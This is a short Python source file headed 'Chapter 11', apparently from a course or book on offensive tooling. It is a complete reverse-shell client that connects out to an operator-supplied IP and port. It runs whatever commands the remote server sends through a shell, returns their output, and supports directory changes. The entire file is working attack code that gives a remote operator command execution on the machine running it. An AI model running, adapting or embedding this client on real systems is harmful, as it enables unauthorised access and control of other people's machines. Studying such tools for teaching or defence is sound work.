#Chapter 11

import sys
import socket
import subprocess
import os

def outbound(message):
    response = str(message).encode()
    sock.send(response)

def inbound():
    print("[+] Awaiting response...")
    message = ''
    while True:
            try:
                message = sock.recv(1024).decode()
                return message
            except Exception:
                sock.close()

def session_handler():
    print(f'[+] Connection to {host_ip}')
    sock.connect((host_ip, host_port))
    print(f'[+] Connected to {host_ip}')
    while True:
        try:
            # Receive the input message, we need to always encode/decode it to bytes.
            message = inbound()
            print("Message received...")
            if message == 'exit':
                print("[+] The server has terminated the session.")
                sock.close()
                break
            elif message.split(" ")[0] == 'cd':
                try:
                    directory = str(message.split(" ")[1])
                    os.chdir(directory)
                    cur_dir = os.getcwd()
                    print(f'[+] Changed to {cur_dir}')
                    outbound(cur_dir)
                except FileNotFoundError:
                    outbound('Invalid directory. Try again')
                    continue
            elif message.split(" ")[0] == 'background':
                pass

            else:
                command = subprocess.Popen(message, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                output = command.stdout.read() + command.stderr.read()
                outbound(output.decode())
        except KeyboardInterrupt:
            print('[+] Keyboard interrupt issued.')
            sock.close()
            break
        except Exception:
            sock.close()
            break

if __name__ == '__main__':
    try:
        host_ip = sys.argv[1]
        host_port = int(sys.argv[2])

        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        session_handler()
    except IndexError:
        print("[-] Command line argument(s) missing. Please try again. ")
    except Exception as e:
        print(e)